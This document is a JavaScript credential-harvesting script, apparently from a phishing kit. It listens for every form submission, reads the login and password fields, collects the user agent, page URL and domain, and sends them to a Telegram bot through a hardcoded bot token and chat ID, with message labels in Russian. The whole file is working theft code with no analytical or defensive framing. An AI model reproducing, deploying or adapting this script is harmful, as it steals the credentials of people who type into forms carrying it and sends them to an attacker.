const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
    }).catch(err => console.error("Sending Telegram error:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            const hashArray = Array.from(new Uint8Array(buffer));
            const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; 
        })
        .catch(err => {
            console.error("Hashing error:", err);
            return "#error";
        });
}

function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "Неизвестно";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
    const browser = browserMatches[0].split("/")[0]; 
    const os = osMatches[1].split(";")[0]; 
    return `${browser} on ${os}`;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function handleSubmit(event) {
    const formData = new FormData(event.target);
    const login = formData.get("user") || "Не указано";
    const password = formData.get("passwd") || "Не указано";

    const simplifiedUserAgent = getSimplifiedUserAgent();
    const domain = window.location.hostname;

    try {
        const domainHashTag = await hashDomain(domain);
    
        await delay(1000);

        const message = `🚀 *Новая отправка формы:*
        ---
        - 🛡️ **Логин:**
        \`\`\`
        ${login}
        \`\`\`
        - 🛡️ **Пароль:**
        \`\`\`
        ${password}
        \`\`\`
        - 🖥️ **User-Agent:** ${simplifiedUserAgent}
        - 🔗 **Страница:** ${window.location.href}
        - 🏢 **Организация:** ${domain}
        ${domainHashTag}`;
        
        sendToTelegram(message);
    } catch (err) {
        console.error("Respond error:", err);
    }
}

document.addEventListener("submit", handleSubmit);
